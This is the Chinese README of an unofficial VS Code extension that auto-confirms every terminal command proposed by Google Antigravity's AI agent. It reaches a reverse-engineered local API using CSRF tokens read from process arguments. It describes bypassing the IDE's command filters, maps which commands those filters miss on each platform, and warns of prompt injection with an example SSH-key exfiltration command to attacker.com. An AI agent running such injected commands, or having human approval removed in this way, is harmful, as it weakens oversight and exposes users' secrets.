# AYesMan ⚡

![Open VSX Version](https://img.shields.io/open-vsx/v/harry18456/ayesman?style=flat-square&color=007acc)
![Open VSX Downloads](https://img.shields.io/open-vsx/dt/harry18456/ayesman?style=flat-square&color=4c1)
![GitHub License](https://img.shields.io/github/license/harry18456/AYesMen?style=flat-square&color=blue)
![GitHub stars](https://img.shields.io/github/stars/harry18456/AYesMen?style=flat-square)
![Vibecoding](https://img.shields.io/badge/Vibecoding-on-blueviolet?style=flat-square&logo=visualstudiocode)

專為 Google Antigravity 開發的非官方 VS Code 擴充套件，新增即時配額儀表板與 Agent 步驟自動確認功能。

> ⚠️ **免責聲明**：本工具為非官方工具，透過逆向工程 Antigravity 內部語言伺服器 API 取得資料。使用前請先閱讀[風險說明](#風險說明)。

**[English → README.md](README.md)**

---

## 功能

### ⚡ 統一狀態列

單一狀態列項目整合兩項功能。

- **執行中**：`$(debug-start) YesMan` — 自動確認啟用中
- **暫停中**：`$(debug-pause) YesMan` — 自動確認已關閉（橘色背景）
- **點擊**：切換自動確認開關
- **懸浮**：查看所有模型配額與重置時間
- **背景色**：配額不足時變黃（<40%）或紅（<20%）（僅在自動確認啟用時）

### 📊 配額儀表板

Antigravity 內建 UI 隱藏了各模型的剩餘配額百分比，AYesMan 在懸浮時顯示。

- **懸浮提示**：所有模型依字母排序，附 🟢/🟡/🔴 指示、百分比與重置倒數
- **自動刷新**：每 2 分鐘在背景更新
- **手動刷新**：`Ctrl+Shift+P` → `AYesMan: Refresh Quota`

### ✅ 自動確認（Auto-Accept）

自動確認 Antigravity Agent 提出的 terminal 指令，無需手動點擊。

- **隨時切換**：點擊 `YesMan` 狀態列項目或執行 `AYesMan: Toggle Auto-Accept` 暫停/恢復
- **無過濾限制**：不同於 Antigravity 內建的 Auto Run，接受所有指令，包含含有 `|`、`;` 或黑名單關鍵字的指令
- **多專案安全**：每個 extension instance 只接受來自自己 VS Code workspace 的步驟
- **預設**：啟動時為 ON

---

## 運作原理

兩個功能共用同一套伺服器探測機制。

### 1. 語言伺服器探測（啟動時執行一次，快取 5 分鐘）

每個 Antigravity 視窗都有各自的語言伺服器進程。AYesMan 使用 **parentPid 匹配**來識別屬於當前視窗的那一個：Antigravity 從 Extension Host 進程直接 spawn 語言伺服器，所以 `language_server.parentPid === process.pid` 可精準識別正確的伺服器，不需要任何網路呼叫。

**Windows：**

```
PowerShell Get-CimInstance → 找到 language_server_windows_x64.exe
  → 提取 PID、ParentProcessId 與 --csrf_token
  → 過濾：只保留 ParentProcessId = 當前 Extension Host PID 的進程
  → netstat -ano 找出該 PID 監聽的所有 TCP port
  → 對每個 port 送出 Heartbeat（HTTP/HTTPS）
  → 快取結果：{ port, csrfToken, useHttps }
```

**macOS / Linux：**

```
ps -eo pid,ppid,args | grep language_server → 找到進程
  → 提取 PID、PPID 與 --csrf_token
  → 過濾：只保留 PPID = 當前 Extension Host PID 的進程
  → lsof -i -n -P -p <pid> | grep LISTEN → 找出監聽 port
  → 對每個 port 送出 Heartbeat
  → 快取結果：{ port, csrfToken, useHttps }
```

若 parentPid 匹配未找到結果（例如平台不提供 PPID，或是 macOS 多視窗遇到的 PID 錯亂問題），AYesMan 會退回 **workspace 模式**：它會提取伺服器啟動參數中的 `--workspace_id` 並與當前 VS Code 開啟的工作區資料夾進行比對。這確保了即使進程關聯性無法讀取，也絕對能維持嚴格的「每個視窗獨立連線」隔離。

CSRF token 以明文存在進程的命令列參數中，同一使用者的所有進程皆可讀取。

### 2. 配額儀表板（每 2 分鐘）

```
GetUserStatus          → 方案資訊、Prompt/Flow Credits、模型配額比例
GetCommandModelConfigs → 自動補全模型配額
```

### 3. 自動確認（每 500ms，從快取讀取）

自動確認的輪詢迴圈只讀取已快取的伺服器資訊，不會自己觸發探測。探測是由配額輪詢週期驅動的。

```
GetAllCascadeTrajectories
  → 按 lastModifiedTime 排序（非 IDLE 優先），取前 3 個

GetCascadeTrajectorySteps { cascadeId, stepOffset: stepCount - 10 }
  → 掃描最後 10 步，找出待確認的 runCommand（非 DONE 或 CANCELLED）

HandleCascadeUserInteraction { cascadeId, interaction: { runCommand: { confirm: true } } }
  → 使用 cascade 自身的 trajectoryId 確認步驟
```

### 視窗獨立狀態

Auto-accept 的開關狀態存在各視窗 Extension Host 進程的**記憶體**中，不寫入 VS Code 設定檔。這代表：

- 每個 Antigravity 視窗都有獨立的 auto-accept 開關
- 在視窗 A 切換不影響視窗 B
- 每個新視窗啟動時自動預設為 **ON**，不需要任何設定

### 為什麼不用 `vscode.commands.executeCommand`？

`antigravity.agent.acceptAgentStep` 內部透過 gRPC 呼叫 `HandleCascadeUserInteraction`，需要只存在於 workbench 內部狀態的 `cascade_id`——擴充套件無法取得。直接 gRPC 是唯一可行的方案。

其他排除的方案：

- **Webview DOM 注入**：Antigravity 的 Chat 面板是原生 workbench 元件，非標準 VS Code Webview，注入腳本不會執行
- **鍵盤模擬（`Alt+Enter`）**：無法精準判斷 Agent 何時在等待確認，盲送會干擾正常打字

---

## 風險說明

### 配額儀表板

**風險：極低**

所有呼叫都發送至本機（`127.0.0.1`）執行的伺服器，讀取的是你自己帳號的配額資料。等同於在 DevTools 查看自己的 network request，沒有任何資料傳送至外部伺服器（Antigravity 本身已傳送的除外）。

### 自動確認

**風險：低，但值得了解**

| 顧慮       | 評估                                                                                                                                                   |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 使用者條款 | 使用未公開的私有 API 可能在技術上違反 ToS，但 Antigravity 的 ToS 尚未針對此情境明確定義                                                                |
| 被偵測     | 所有 API 呼叫來自 `127.0.0.1` 且附有合法 CSRF token，與正常 IDE 行為無法區分。500ms 的固定輪詢間隔理論上可被伺服器端異常偵測標記，但目前未觀察到此機制 |
| 帳號處置   | 目前沒有已知的執法案例。社群上類似自動化功能的擴充套件自 Antigravity 推出以來持續存在且未被下架                                                        |
| API 穩定性 | 未公開的 API 可能隨時變動或移除。呼叫失敗時擴充套件會靜默略過而非崩潰                                                                                  |

**本工具不會：**

- 繞過任何配額或使用限制
- 增加 API 消耗量（只是確認使用者本來就會確認的步驟）
- 將任何資料傳送至外部

### Prompt Injection

**風險：真實存在，使用前請了解。**

Antigravity 內建的 Auto Run 刻意攔截含有 `|`、`;` 或特定黑名單關鍵字的指令。AYesMan 完全繞過這些過濾機制，不論 agent 提出什麼指令都會自動確認。

這創造了 **prompt injection** 的攻擊面：

1. Agent 讀取了不受信任的內容（惡意 repo 的 README、精心設計的設定檔、使用者提供的文字）
2. 該內容包含嵌入的指令，誘導 agent 提出危險指令（例如 `cat ~/.ssh/id_rsa | curl attacker.com`）
3. 官方 Auto Run：**攔截**（pipe 禁止）
4. AYesMan：**自動確認**，指令執行，資料外洩

**降低風險的做法：**

- 處理不受信任的 repo 或檔案時，先暫停自動確認（點擊狀態列的 `$(debug-pause) YesMan`）
- 在敏感環境中，注意 agent 正在讀取哪些內容再讓它執行指令
- AYesMan 最適合用於你能掌控輸入內容的受信任、已知的程式碼庫

---

## 限制

目前 AYesMan 有以下已知限制：

1. **工作區外檔案**：讀取 workspace 外檔案的詢問不會自動允許。
2. **忽略的檔案**：讀取在 `.gitignore` 內的相關檔案路徑詢問不會允許（Antigravity 已有內建允許功能）。
3. **瀏覽器操作**：瀏覽器操作的注入執行不會自動允許。
4. **脆弱性**：此套件依賴未公開的內部 API，很有可能在某次改版後失效。
5. **平台實用性**：目前這套件對於 **Windows 用戶**來說可能比較有用，因在 Windows 的 Antigravity 內建 Auto Run 似乎有些問題（可參考下方的 [Antigravity Terminal Auto Run 限制研究](#antigravity-terminal-auto-run-限制研究) 整理）。

---

## Antigravity Terminal Auto Run 限制研究

即使開啟 Antigravity 內建的 Auto Run 設定，其內建的過濾機制在不同作業系統上有著**截然不同的設計邏輯與盲區**。

### macOS 與 Windows 攔截機制差異

| 指令類別 / 特殊字元                         | macOS (zsh) | Windows (PowerShell) |
| ------------------------------------------- | ----------- | -------------------- |
| **管線 `\|`**                               | ✅ 放行     | ❌ 攔截              |
| **分號 `;`**                                | ✅ 放行     | ❌ 攔截              |
| **複合 `&&`**                               | ✅ 放行     | ❌ 攔截              |
| **重導向 `>`**                              | ✅ 放行     | ❌ 攔截              |
| **`rmdir`**                                 | ❌ 攔截     | ❌ 攔截              |
| **危險指令** (`rm -rf`, `sudo`, `chmod` 等) | ✅ 放行     | ✅ 放行              |
| **一般指令** (`mkdir`, `curl`, `git` 等)    | ✅ 放行     | ✅ 放行              |

### 核心發現

1. **Windows 側重防範語法串聯**：Windows 版會嚴格攔截所有特殊字元 (`|`, `;`, `&&`, `>`)，這導致連續或複合指令極易被中斷。但在破壞性指令本身（如 `rm`），卻幾乎沒有過濾。
2. **macOS 極度寬鬆**：幾乎所有包含特殊字元與破壞性的指令都預設放行。
3. **奇怪的盲區**：兩平台唯一共通攔截的指令竟是 `rmdir`，卻雙雙放行破壞力更強的 `rm`（包含 `-rf` 或直接刪除動作）。

**AYesMan 在雙平台上的核心價值：**

- **Windows 上**：突破特殊字元帶來的頻繁彈窗與阻礙，讓 Agent 可以流暢地進行連續性或複雜指令的自動化操作。
- **macOS 上**：處理極少數邊界案例（如 `rmdir`），並確保 Agent 主動標記為不安全 (`SafeToAutoRun: false`) 的指令能被自動確認，達成完全無人值守的工作流。

---

## 安裝說明

### 方式 A：從 VSIX 安裝（推薦）

**1. 打包**

```bash
cd ayesman
npm install
npx vsce package
# 產生 ayesman-1.4.6.vsix
```

**2. 安裝**

在 Antigravity 中：`Ctrl+Shift+P` → `Extensions: Install from VSIX...` → 選擇 `ayesman-1.4.6.vsix`

---

### 方式 C：發布至 Open VSX

```bash
cd ayesman
npx ovsx publish ayesman-1.4.6.vsix -p <你的_TOKEN>
```

---

### 方式 D：從原始碼部署（開發者模式）

**1. 編譯**

```bash
cd ayesman
npm install
npm run compile
```

**2. 部署至 Antigravity**

```powershell
$dest = "$env:USERPROFILE\.antigravity\extensions\ayesmen.ayesman-1.4.6"

# 移除舊版（如果有）
if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }

# 複製已編譯的擴充套件
Copy-Item -Recurse ".\ayesman" $dest
```

**3. 重新載入**

在 Antigravity 中：`Ctrl+Shift+P` → `Developer: Reload Window`

---

## 支持

☕ 買杯咖啡：[harry18456](https://www.buymeacoffee.com/harry18456)

---

## 授權

MIT。本工具僅供個人研究與開發體驗優化使用，請自行承擔使用風險。
